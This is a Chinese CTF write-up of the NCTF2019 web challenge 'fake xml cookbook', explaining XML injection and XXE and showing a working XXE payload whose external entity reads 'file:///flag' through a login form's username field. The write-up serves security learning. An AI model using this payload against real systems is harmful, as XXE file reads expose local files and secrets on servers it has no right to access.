---
title: NCTF2019_Fakexml_cookbook
date: 2019-12-27
image: 
description: 南京邮电大学举办的比赛，也是我和队友命运交织的地方。虽然题目做的不多，但是这场比赛深深的影响到了我，让我爱上了web安全
categories: 
- ctf_writeup
tags:
- XXE
---

NCTF2019web1:fake xml cookbook_writeup

By:0xfxxker_wh1sper

解题思路：

这道题名字是XML，关于XML我知道的只有两种手段，一是普通XML注入，通过闭合各种标签然后植入恶意代码运行脚本，但是一般这种手段实在攻击者能够掌握password字段并且能够保存到服务器当中去才能够添加一个新的admin账户（当时也在这里卡了很久），还有一种就是XXE(XML External Entity Injection) 全称为 XML 外部实体注入，利用点是外部实体，如果能注入，外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面（这可能就是为什么单独说 而没有说 XML 注入的原因吧，或许普通的 XML 注入真的太鸡肋了，现实中几乎用不到）。

用户名，密码随便试一下：

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120164837.png)

抓包，分析:

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120164848.png)

于是我构造了如下XML外部实体，大概是这样

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120164909.png)

注意事项：
```
<?xml version="1.0"?>
<!DOCTYPE dy（这里有一个空格） [
<!ENTITY dy SYSTEM "file:///flag">
]>
<user><username>&dy;（分号）</username><password>123</password></user>
```
通过POST请求发过去

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120164914.png)

服务器说登录失败，并且返回&dy，也就是/flag的内容

这里挂一篇关于xxe的学习文档：http://url.cn/54Ucm5w